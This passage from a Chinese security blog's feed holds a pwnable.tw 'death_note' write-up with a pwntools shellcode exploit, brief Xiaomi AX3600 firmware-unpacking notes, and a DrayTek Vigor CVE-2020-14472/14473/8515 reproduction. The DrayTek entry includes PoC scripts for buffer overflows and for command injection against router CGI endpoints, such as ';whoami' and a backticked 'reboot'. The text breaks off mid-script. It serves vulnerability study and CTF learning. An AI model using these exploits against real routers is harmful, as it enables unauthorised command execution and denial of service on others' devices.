a</code>替换</p><p><code>int 0x80</code>通过 <code>xor sub and inc dec</code> 操作</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./death_note&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10201</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;choice :&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx, name):</span><br><span class="line">menu(1)</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line">io.sendlineafter(&quot;Name :&quot;, name)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">menu(2)</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">menu(3)</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">sh = process(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"># gdb.attach(io,&apos;b *0x80487ef&apos;)</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = 0</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"># shellcode = shellcraft.sh()</span><br><span class="line"></span><br><span class="line">/* execve(path=&apos;/bin///sh&apos;, argv=[&apos;sh&apos;], envp=0) */</span><br><span class="line">    /* push &apos;/bin///sh\x00&apos; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&apos;sh\x00&apos;] */</span><br><span class="line">    /* push &apos;sh\x00\x00&apos; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &apos;sh\x00&apos; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push 11 /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">shellcode = &apos;&apos;&apos;</span><br><span class="line">/*ebx &apos;/bin///sh&apos;*/</span><br><span class="line">push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    push esp</span><br><span class="line">    pop ebx</span><br><span class="line">    </span><br><span class="line">    /*edx 0xfffffffe --- dl 0xfe*/</span><br><span class="line">    push edx</span><br><span class="line">dec edx</span><br><span class="line">dec edx</span><br><span class="line"></span><br><span class="line">/*0xcd 0x80*/</span><br><span class="line">xor [eax+32], dl</span><br><span class="line">xor [eax+33], dl</span><br><span class="line"></span><br><span class="line">/*edx ecx 0*/</span><br><span class="line">inc edx</span><br><span class="line">inc edx</span><br><span class="line">push edx</span><br><span class="line">pop ecx</span><br><span class="line"></span><br><span class="line">push 0x40</span><br><span class="line">pop eax</span><br><span class="line">xor al,0x4b</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">add(-19, asm(shellcode)+&apos;\x33\x7e&apos;)</span><br><span class="line">delete(-19)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br></pre></td></tr></table></figure><blockquote><p>shellcode的好文章：</p><p>🔺<a href="https://xz.aliyun.com/t/6645" target="_blank" rel="noopener">shellcode 的艺术</a></p><p>🔺和本题很相关的Ex🐂的文章<a href="http://blog.eonew.cn/archives/1125" target="_blank" rel="noopener">生成可打印的shellcode</a></p><p><a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener">编写x64字母数字shellcode</a></p><p><a href="https://www.exploit-db.com/exploits/35205" target="_blank" rel="noopener">Linux/x64 – execve(“/bin/sh”,NULL,NULL) + Position Independent + Alphanumeric Shellcode (87 bytes)</a></p><p><a href="https://blog.csdn.net/Virtual_Func/article/details/49454801" target="_blank" rel="noopener">系统调用与中断</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/9258785.html" target="_blank" rel="noopener">Linux pwn入门教程(2)——shellcode的使用，原理与变形</a></p><p>可转可见shellcode工具<a href="https://github.com/VincentDary/PolyAsciiShellGen" target="_blank" rel="noopener">https://github.com/VincentDary/PolyAsciiShellGen</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;death-note&quot;&gt;&lt;a href=&quot;#death-note&quot; class=&quot;headerlink&quot; title=&quot;death_note&quot;&gt;&lt;/a&gt;death_note&lt;/h1&gt;&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>小米路由器AX3600 逻辑漏洞（简短记录</title>
    <link href="p1Kk.github.io/2021/03/13/iot/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>p1Kk.github.io/2021/03/13/iot/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-12T16:00:00.000Z</published>
    <updated>2021-04-14T12:55:19.915Z</updated>
    
    <content type="html"><![CDATA[<p>影响版本：应该是v1.0.20之前</p><p>固件下载地址：<a href="http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin" target="_blank" rel="noopener">http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin</a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk miwifi_r3600_firmware_5da25_1.0.17.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">684           0x2AC           UBI erase count header, version: 1, EC: 0x0, VID header offset: 0x800, data offset: 0x1000</span><br><span class="line"></span><br><span class="line"># UBI文件，使用ubi-reader</span><br><span class="line">$ binwalk -Me miwifi_r3600_firmware_5da25_1.0.17.bin </span><br><span class="line">$ ubireader_extract_images 2AC.ubi </span><br><span class="line">$ cd ubifs-root/1696626347</span><br><span class="line">$ ubireader_extract_files img-1696626347_vol-ubi_rootfs.ubifs </span><br><span class="line">guess_start_offset Fatal: Could not determine start offset.</span><br><span class="line"># 报错了，具体原因我还没查到，但在github源代码里有看到这句报错...（视频中他第一次使用images就出现了这个问题，发现是ubi-reader自身代码问题</span><br><span class="line">$ unsquashfs ./img-1696626347_vol-ubi_rootfs.ubifs </span><br><span class="line">$ cd squashfs-root</span><br></pre></td></tr></table></figure><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>根据ppt，扫描到开放了6个tcp端口：53（DNS），80，784（unknown），8080，8098，8999</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>看着bilibili的演讲视频…发现自己并没有条件去复现…视频里还用0day来获取shell，直接GG。视频讲的听清楚了，看看得了…</p><blockquote><p>Reference</p><p>【长亭HITCON演讲视频】如何从零开始攻破一台明星IoT设备：<a href="https://www.bilibili.com/video/BV1gf4y1D7L2" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1gf4y1D7L2</a></p><p>演讲PPT下载地址，链接: <a href="https://pan.baidu.com/s/1VEf1c1jmxdziyvLhzGM8dw" target="_blank" rel="noopener">https://pan.baidu.com/s/1VEf1c1jmxdziyvLhzGM8dw</a> 密码: 3ien</p><p><a href="https://x1ng.top/2020/12/16/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://x1ng.top/2020/12/16/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;影响版本：应该是v1.0.20之前&lt;/p&gt;
&lt;p&gt;固件下载地址：&lt;a href=&quot;http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin&quot; </summary>
      
    
    
    
    <category term="漏洞复现" scheme="p1Kk.github.io/categories/漏洞复现/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="路由器" scheme="p1Kk.github.io/tags/路由器/"/>
    
    <category term="逻辑漏洞" scheme="p1Kk.github.io/tags/逻辑漏洞/"/>
    
  </entry>
  
  <entry>
    <title>DrayTek Vigor CVE-2020-14472 CVE-2020-8515命令注入/14473栈溢出 漏洞复现</title>
    <link href="p1Kk.github.io/2021/02/14/iot/DrayTek%20Vigor%20CVE-2020-1447214473/"/>
    <id>p1Kk.github.io/2021/02/14/iot/DrayTek%20Vigor%20CVE-2020-1447214473/</id>
    <published>2021-02-13T16:00:00.000Z</published>
    <updated>2021-07-14T02:54:01.382Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-14472-CVE-2020-14473"><a href="#CVE-2020-14472-CVE-2020-14473" class="headerlink" title="CVE-2020-14472/CVE-2020-14473"></a>CVE-2020-14472/CVE-2020-14473</h1><p>版本要求：DrayTek Vigor2960/3900/300B  version&lt;1.5.1.1<br>固件下载地址：<a href="http://www.draytek.com.cn/support/DownloadShow.php" target="_blank" rel="noopener">http://www.draytek.com.cn/support/DownloadShow.php</a></p><blockquote><p>从HWS课程@C0ss4ck 讲解中学习</p><ol><li><p>寻找攻击面：</p><ol><li><p>nmap扫描目标开启了哪些服务</p></li><li><p>如1723（pptp），500（LT2P），8001（vcom-tunnel）是vpn相关端口，安全性较高，<strong>不做考虑</strong></p></li><li><p>443（https），80（http） 基于lighttp设计，使用了大量CGI拓展，重点关注。</p></li></ol></li><li><p>固件解包</p><ol><li><p>binwalk查看包，发现有<code>UBI erease count header...</code>，<strong>ubireader</strong>——针对ubi的提取工具，使用这个工具进行提取</p></li><li><p>进入提取后目录，进入<code>etc/init.d</code>查看默认启动项</p></li><li><p>回到提取目录，查找httpd相关，尤其是在/etc/init.d下的，查看该文件，以及httpd的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;       find . | grep httpd</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></li></ol></blockquote><blockquote><ol start="4"><li>注意<strong>二次开发</strong>产物，到www/cgi-bin目录下，查看cgi文件</li></ol><ol start="3"><li><p>逆向分析</p><ol><li>命令注入（授权前 | 授权后）</li><li>溢出</li></ol></li></ol></blockquote><p>我使用的是v1.5.1，还存在很多其他漏洞，这里只说明这两个cve中存在的漏洞。</p><h2 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h2><p>binwalk查看固件</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/2960ubi.png" alt></p><p>下载<a href="https://github.com/jrspruitt/ubi_reader" target="_blank" rel="noopener">ubireader</a>，使用ubireader进行固件解包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ubireader_extract_images Vigor2960_v1.5.1.all</span><br><span class="line">$ ubireader_extract_files img-1000863340_vol-rootfs.ubifs</span><br></pre></td></tr></table></figure><h2 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h2><ul><li>checksec</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kk/iot/DrayTek/Vigor2960_v1.5.1/ubifs-root/Vigor2960_v1.5.1.all/ubifs-root/www/cgi-bin/mainfunction.cgi&apos;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><ul><li><p>nmap</p><p>在fofa找相关（使用默认登录账号密码失败…） nmap扫一下<img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/2960nmap.png" alt></p></li><li><p>查找httpd相关的默认启动项（在init.d目录下）</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/init_httpd.png" alt></p><p>基于lighttpd设计，存在大量的CGI拓展。</p><p>lighttpd是一个轻量级的web服务器，一般会有cgi文件作为支持，在./etc/lighttpd/lighttpd.conf中可以看到服务器的各个配置项，在分析固件之前可以先查看一下服务器的配置文件，这样有助于我们确定分析目标。</p></li><li><p>ida</p><p>在start函数中，找到main，并重命名函数名，在main函数开始，就是获取环境变量<code>PATH_INFO</code>，并根据<code>PATH_INFO</code>的值来分流。</p><p>在login中，发现<strong>溢出【1】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/loginOverflow.png" alt></p><p>如果不存在匹配的值，就执行下面的代码</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/matchFunction2.png" alt></p><p>所以我们来看一下匹配后的对应函数。在<code>get_subconfig</code>、<code>doOpenVPN</code>、<code>doGRETunnel</code>、<code>download_ovpn</code>、<code>ruequest_certificate</code>、<code>dumpSyslog</code>、<code>delete_wlan_profile</code>、<code>set_ap_map_config</code>中存在<strong>命令注入【1~8】</strong>。形如以下：</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/subconfig.png" alt></p><p>在<code>authuser</code>中存在<strong>命令注入【9】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/smsphonenmber.png" alt></p><p>这个函数继续往下看，有几个函数对url进行了处理</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/smsurl.png" alt></p><p>在这些函数中，都使用了decode_url（已重命名）对url进行转义操作</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/usedecodeurl.png" alt></p><p>在url_decode函数中进入转义函数</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/uridecode.png" alt><br><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/zhuanyi.png" alt></p><p>此处存在<strong>溢出【2】</strong></p></li></ul><h2 id="poc（用的是公开的，未验证"><a href="#poc（用的是公开的，未验证" class="headerlink" title="poc（用的是公开的，未验证"></a>poc（用的是公开的，未验证</h2><ul><li>溢出【1】</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">buf = b64encode(b&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;)</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/raw&quot;</span><br><span class="line">    &quot;Authorization&quot;: &quot;Basic &quot;+buf</span><br><span class="line">&#125;</span><br><span class="line">url = &#123;</span><br><span class="line">    &quot;root&quot;: &quot;http://192.168.1.1&quot;,</span><br><span class="line">    &quot;cgi&quot;: &#123;</span><br><span class="line">        &quot;root&quot;: &quot;/cgi-bin&quot;,</span><br><span class="line">        &quot;uri&quot;: &#123;</span><br><span class="line">            &quot;mf&quot;: &quot;/mainfunction.cgi&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def build_url(p1, p2=None):</span><br><span class="line">    if p2:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1][&quot;root&quot;] + url[p1][&quot;uri&quot;][p2]</span><br><span class="line">    else:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1]</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(build_url(&quot;cgi&quot;, &quot;mf&quot;)+&quot;/login&quot;, headers=header)</span><br></pre></td></tr></table></figure><ul><li>溢出【2】</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def poc(url):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;UserAgent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url = url + &quot;/cgi-bin/mainfunction.cgi&quot;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;action&quot;: &quot;web_portal_bypass_ok&quot;,</span><br><span class="line">        &quot;url&quot;:&quot;http://&quot;+&quot;\x40&quot;*0xFFF+&quot;/&quot;,</span><br><span class="line">        &quot;is_android&quot;:&quot;ture&quot;</span><br><span class="line">    &#125;    </span><br><span class="line">    res = requests.post(url=url, verify = False, data=data, timeout=(10, 15), headers=headers)</span><br><span class="line"></span><br><span class="line">    if res.status_code != 200:</span><br><span class="line">        print(res.text)</span><br><span class="line">    else:</span><br><span class="line">        print(res.text)</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">poc(&quot;http://192.168.1.1&quot;)</span><br></pre></td></tr></table></figure><ul><li>命令注入【1~8】</li></ul><p>大多都是来自发送的http_input中读取的参数，未验证就拼接字符串，直接system执行，实现命令注入。（脚本似乎还有不对…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;URL&quot;: &quot;xxx&quot;,</span><br><span class="line">    &quot;HOST&quot;: &quot;https://xxx&quot;,</span><br><span class="line">    &quot;action&quot;: &quot;apply&quot;,</span><br><span class="line">    &quot;config&quot;: &quot;;whoami&quot;</span><br><span class="line">&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/raw&quot;</span><br><span class="line">&#125;</span><br><span class="line">url = &#123;</span><br><span class="line">    &quot;root&quot;: &quot;https://xx&quot;,</span><br><span class="line">    &quot;cgi&quot;: &#123;</span><br><span class="line">        &quot;root&quot;: &quot;/cgi-bin&quot;,</span><br><span class="line">        &quot;uri&quot;: &#123;</span><br><span class="line">            &quot;mf&quot;: &quot;/mainfunction.cgi&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def build_url(p1, p2=None):</span><br><span class="line">    if p2:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1][&quot;root&quot;] + url[p1][&quot;uri&quot;][p2]</span><br><span class="line">    else:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1]</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(build_url(&quot;cgi&quot;, &quot;mf&quot;), data=data, headers=header)</span><br></pre></td></tr></table></figure><ul><li>命令注入【9】</li></ul><p>允许ＳＭＳ登录，并已知用户的手机号或者ＳＭＳ管理员的手机号码，就可以在password中拼接shell命令执行命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;URL&quot;: &quot;192.168.1.1&quot;,</span><br><span class="line">    &quot;HOST&quot;: &quot;http://192.168.1.1&quot;,</span><br><span class="line">    &quot;action&quot;: &quot;authuser&quot;,</span><br><span class="line">    &quot;formusername&quot;: b64encode(b&quot;test&quot;).decode(),</span><br><span class="line">    &quot;formpassword&quot;: b64encode(b&quot;12345678`reboot`&quot;).decode(),</span><br><span class="line">    &quot;PHONENUMBER&quot;: argv[1] # the known phone number</span><br><span class="line">&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/raw&quot;</span><br><span class="line">&#125;</span><br><span class="line">url = &#123;</span><br><span class="line">    &quot;root&quot;: &quot;http://192.168.1.1&quot;,</span><br><span class="line">    &quot;cgi&quot;: &#123;</span><br><span class="line">        &quot;root&quot;: &quot;/cgi-bin&quot;,</span><br><span class="line">        &quot;uri&quot;: &#123;</span><br><span class="line">            &quot;mf&quot;: &quot;/mainfunction.cgi&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def build_url(p1, p2=None):</span><br><span class="line">    if p2:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1][&quot;root&quot;] + url[p1][&quot;uri&quot;][p2]</span><br><span class="line">    else:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1]</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(build_url(&quot;cgi&quot;, &quot;mf&quot;), data=data, headers=header)</span><br></pre></td></tr></table></figure><h1 id="CVE-2020-8515"><a href="#CVE-2020-8515" class="headerlink" title="CVE-2020-8515"></a>CVE-2020-8515</h1><p>公网上这个漏洞基本都已修复了…简单介绍一下</p><p>漏洞存在于上面说的分支中的<code>login</code>函数中所提取的<code>keyPath</code>，首先对<code>keyPath</code>进行了check，过滤了常用的`;|&gt;$(空格等命令拼接字符，后面就是常见的命令注入，将keyPath拼接字符串后popen()😥</p><h2 id="poc（已验证"><a href="#poc（已验证" class="headerlink" title="poc（已验证"></a>poc（已验证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from base64 import 